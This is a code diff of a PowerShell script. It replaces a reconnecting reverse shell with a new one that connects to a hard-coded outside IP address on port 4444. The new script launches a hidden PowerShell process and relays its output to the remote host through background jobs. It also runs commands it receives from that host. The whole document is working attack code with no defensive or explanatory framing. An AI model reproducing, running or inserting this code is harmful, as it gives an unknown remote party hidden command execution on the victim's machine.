@@ -20,48 +20,67 @@
 #     Start-Sleep -Seconds 10
 # }
 
+$client = New-Object System.Net.Sockets.TCPClient("45.154.3.68", 4444)
+$stream = $client.GetStream()
+$networkStream = New-Object System.IO.StreamWriter($stream)
+$networkReader = New-Object System.IO.StreamReader($stream)
+
+# Create a hidden PowerShell process with redirected I/O
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.RedirectStandardInput = $true
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError = $true
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo = $psi
+$process.Start() | Out-Null
+
+$stdout = $process.StandardOutput
+$stderr = $process.StandardError
+$stdin = $process.StandardInput
+
+# Background thread to write PowerShell output to socket
+Start-Job {
+    while (-not $stdout.EndOfStream) {
+        try {
+            $line = $stdout.ReadLine()
+            if ($line) {
+                $bytes = [System.Text.Encoding]::ASCII.GetBytes($line + "`n")
+                $stream.Write($bytes, 0, $bytes.Length)
+                $stream.Flush()
+            }
+        } catch {}
+    }
+} | Out-Null
+
+# Background thread to also stream stderr
+Start-Job {
+    while (-not $stderr.EndOfStream) {
+        try {
+            $line = $stderr.ReadLine()
+            if ($line) {
+                $bytes = [System.Text.Encoding]::ASCII.GetBytes($line + "`n")
+                $stream.Write($bytes, 0, $bytes.Length)
+                $stream.Flush()
+            }
+        } catch {}
+    }
+} | Out-Null
+
+# Main loop: read from socket and feed into PowerShell stdin
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient("45.154.3.68", 4444)
-        $stream = $client.GetStream()
-
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $writer.AutoFlush = $true
-        $reader = New-Object System.IO.StreamReader($stream)
-
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "powershell.exe"
-        $psi.RedirectStandardInput = $true
-        $psi.RedirectStandardOutput = $true
-        $psi.RedirectStandardError = $true
-        $psi.UseShellExecute = $false
-        $psi.CreateNoWindow = $true
-
-        $proc = New-Object System.Diagnostics.Process
-        $proc.StartInfo = $psi
-        $proc.Start() | Out-Null
-
-        $stdout = $proc.StandardOutput
-        $stderr = $proc.StandardError
-        $stdin = $proc.StandardInput
-
-        Start-Job -ScriptBlock {
-            param($reader, $stdin)
-            while ($true) {
-                $cmd = $reader.ReadLine()
-                if ($cmd -eq $null) { break }
-                $stdin.WriteLine($cmd)
-            }
-        } -ArgumentList $reader, $stdin | Out-Null
-
-        while (-not $stdout.EndOfStream) {
-            $line = $stdout.ReadLine()
-            $writer.WriteLine($line)
+        $input = $networkReader.ReadLine()
+        if ($input -ne $null) {
+            $stdin.WriteLine($input)
+            $stdin.Flush()
         }
-
-        $proc.Close()
-        $client.Close()
     } catch {
+        break
     }
-    Start-Sleep -Seconds 5
 }
+
+$client.Close()
